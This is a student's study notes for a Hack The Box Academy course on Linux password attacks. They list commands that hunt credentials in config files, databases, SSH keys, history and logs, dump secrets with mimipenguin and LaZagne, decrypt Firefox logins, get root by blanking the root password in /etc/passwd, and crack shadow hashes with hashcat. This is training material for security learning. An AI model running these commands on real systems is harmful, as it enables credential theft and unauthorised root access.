## HTB-ACADEMY (Passsword attacks / Linux)
## Ivan Medina
---

### Credential Hunting in Linux

##### **Files**

##### *Configuration Files*

```for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done```

##### *Credentials in Configuration Files*

```for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done```

##### *Databases*

```for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done```

##### *Notes*

```find /home/* -type f -name "*.txt" -o ! -name "*.*"```

##### *Scripts*

```for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done```

##### *Cronjobs*

```cat /etc/crontab```
```ls -la /etc/cron.*/```

##### *SSH Keys*

**SSH Private Keys**

```grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"```

**SSH Public Keys**

```grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"```

##### *History*

**Bash History**

```tail -n5 /home/*/.bash*```

**Logs**

```for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done```

##### **Memory Cache**

##### *Memory - Mimipenguin*

```sudo python3 mimipenguin.py```

##### *Memory - LaZagne*

```sudo python2.7 laZagne.py all```

##### **Browsers**

##### *Firefox Stored Credentials*

```ls -l .mozilla/firefox/ | grep default```

```cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .```

##### *Decrypting Firefox Credentials*

```python3.9 firefox_decrypt.py```

##### *Browsers - LaZagne*

```python3 laZagne.py browsers```

### Passwd, Shadow & Opasswd 

##### **Passwd Format**

|Login name|		Password info	|	UID		|GUID	|	Full name/comments	|	Home directory	|	Shell|
|---|---|---|---|---|---|---|
|cry0l1t3	: |	x	: |	1000	: |	1000	: |	cry0l1t3,,,	: |	/home/cry0l1t3	: |	/bin/bash |

##### **Passwd File**

> /etc/passwd is readable system-wide, giving attackers the possibility to crack the passwords if hashes are stored here.
Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.

1. Editing /etc/passwd - Before
```root:x:0:0:root:/root:/bin/bash```
2. Editing /etc/passwd - After
```root::0:0:root:/root:/bin/bash```
3. Root without Password
```
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd
root::0:0:root:/root:/bin/bash
[cry0l1t3@parrot]─[~]$ su
[root@parrot]─[/home/cry0l1t3]#
```

##### **Shadow File**

> If there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid. The /etc/shadow file is also only readable by users who have administrator rights. 

##### **Shadow Format**

| Username	|	Encrypted password	 |	Last PW change	|	Min. PW age	|	Max. PW age	|	Warning period |	Inactivity period |	Expiration date	Unused |
|---|---|---|---|---|---|---|---|
|cry0l1t3	: |	$6$wBRzy$...SNIP...x9cDWUxW1	: |	18937	: |	0	: |	99999	: |	7	: |	: |	:|

``` $<type>$<salt>$<hashed> ```

##### **Algorithm Types**

- $1$ – MD5
- $2a$ – Blowfish
- $2y$ – Eksblowfish
- $5$ – SHA-256
- $6$ – SHA-512

##### **Opasswd**

The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. 

```
ivxnmxdxnx@htb[/htb]$ sudo cat /etc/security/opasswd
cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

##### **Cracking Linux Credentials**

##### *Unshadow*

```
ivxnmxdxnx@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
ivxnmxdxnx@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
ivxnmxdxnx@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

##### *Hashcat - Cracking Unshadowed Hashes*

```ivxnmxdxnx@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked```

##### *Hashcat - Cracking MD5 Hashes*

```
ivxnmxdxnx@htb[/htb]$ cat md5-hashes.list
qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```

```
ivxnmxdxnx@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```